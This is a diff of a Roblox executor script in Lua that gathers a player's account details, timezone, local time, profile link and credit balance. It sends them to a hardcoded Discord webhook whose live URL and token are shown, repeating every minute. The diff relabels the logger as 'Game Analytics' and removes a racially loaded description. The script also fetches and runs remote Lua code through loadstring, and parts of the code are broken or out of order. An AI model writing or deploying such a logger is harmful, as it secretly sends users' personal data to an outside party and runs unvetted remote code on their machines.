@@ -1,5 +1,36 @@
-local url = "https://discord.com/api/webhooks/1112487123740786790/TVUymR6dD5W911jHju6z-yen5zPs08BbFBQA5t8es5eRTudH_khupPDlIEuhyFsuM0pL"
-local customContent = ""
+local httpService = game:GetService("HttpService")
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+local function sendRequest()
+    local player = game.Players.LocalPlayer
+
+    data.embeds[1].fields[4].value = getAccountAge(player)
+    data.embeds[1].fields[5].value = hasPremium(player) and "Premium" or "Not Premium"
+    data.embeds[1].fields[2].value = getPlayerCount()
+    data.embeds[1].fields[6].value = os.date("%Z") -- Current Timezone
+    data.embeds[1].fields[7].value = os.date("%c") -- Local Time
+    data.embeds[1].fields[8].value = "https://www.roblox.com/users/" .. playerId .. "/profile" -- Profile Link
+    data.embeds[1].fields[9].value = getPlayerState(player)
+    data.embeds[1].fields[10].value = getCreditBalance(player) -- Set the credit balance value
+
+    local encodedData = httpService:JSONEncode(data)
+    local httpRequest = {
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = encodedData
+    }
+    local request = http_request or request or HttpPost or syn.request
+    request(httpRequest)
+    
+    -- Update the embed with the message
+    data.embeds[1].description = "Script fully executed!"
+    encodedData = httpService:JSONEncode(data)
+    httpRequest.Body = encodedData
+    request(httpRequest)
+end
 
 local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
 local gameName = gameInfo.Name
@@ -52,60 +83,68 @@ local function getCreditBalance(player)
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats then
         local creditBalanceValue = leaderstats:FindFirstChild("CreditBalance")
-        if creditBalanceValue then
+        if creditBalanceValue and creditBalanceValue:IsA("IntValue") then
             return creditBalanceValue.Value
         end
     end
-    return 0 -- Return 0 if the credit balance is not found
-end
-
-local function updatePlaytime()
-    while true do
-        local currentTime = os.time()
-        local playtimeSeconds = currentTime - startTime
-        local playtimeFormatted = formatTime(playtimeSeconds)
-        data.embeds[1].fields[2].value = playtimeFormatted
-        wait(1) -- Update every second
-    end
+    return 0
 end
 
 local data = {
-    content = customContent,
-    embeds = {
-        {
-            title = "**Username: " .. game.Players.LocalPlayer.Name .. " (" .. game.Players.LocalPlayer.DisplayName .. ")  " .. gameName .. "!**",
-            description = "This Black one is up to no good",
-            type = "rich",
-            color = tonumber(4334245),
-            fields = {
-                { name = "Player ID", value = playerId, inline = true },
-                { name = "Player Count", value = "Calculating...", inline = true },
-                { name = "Playtime", value = "Calculating...", inline = true },
-                { name = "Account Age", value = "Calculating...", inline = true },
-                { name = "Premium Status", value = "Calculating...", inline = true },
-                { name = "Timezone", value = "Calculating...", inline = true },
-                { name = "Local Time", value = "Calculating...", inline = true },
-                { name = "Profile Link", value = "Calculating...", inline = true },
-                { name = "State", value = "Calculating...", inline = true },
-                { name = "Credit Balance", value = "Calculating...", inline = true } -- New field for credit balance
-            },
-            image = {
-                url = avatarImage
-            }
+    content = "",
+    embeds = {{
+        title = "Game Analytics",
+        description = "Analytics for " .. gameName,
+        color = 16711680, -- Red
+        thumbnail = {
+            url = avatarImage
         },
-        {
-            title = "Game Link",
-            description = "[" .. gameName .. "](" .. gameLink .. ")",
-            type = "rich",
-            color = tonumber(16711680),
+        fields = {
+            {
+                name = "Game Name",
+                value = gameName
+            },
+            {
+                name = "Player Count",
+                value = ""
+            },
+            {
+                name = "Server ID",
+                value = gameId
+            },
+            {
+                name = "Account Age",
+                value = ""
+            },
+            {
+                name = "Premium",
+                value = ""
+            },
+            {
+                name = "Timezone",
+                value = ""
+            },
+            {
+                name = "Local Time",
+                value = ""
+            },
+            {
+                name = "Profile Link",
+                value = ""
+            },
+            {
+                name = "Player State",
+                value = ""
+            },
+            {
+                name = "Credit Balance",
+                value = ""
+            }
         }
-    }
+    }}
 }
 
-local httpService = game:GetService("HttpService")
-local headers = {
-    ["Content-Type"] = "application/json"
-}
+local url = "https://discord.com/api/webhooks/1112487123740786790/TVUymR6dD5W911jHju6z-yen5zPs08BbFBQA5t8es5eRTudH_khupPDlIEuhyFsuM0pL"
 
 local function sendRequest()
     local player = game.Players.LocalPlayer
@@ -174,7 +213,25 @@ spawn(function()
     copyButton:Destroy()
 end)
 
+local function updatePlaytime()
+    local currentTime = os.time()
+    local playtime = currentTime - startTime
+    data.embeds[1].fields[3].value = formatTime(playtime)
+    local encodedData = httpService:JSONEncode(data)
+    local httpRequest = {
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = encodedData
+    }
+    local request = http_request or request or HttpPost or syn.request
+    request(httpRequest)
+    wait(60)
+    updatePlaytime()
+end
+
 updatePlaytime()
+
 
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
 
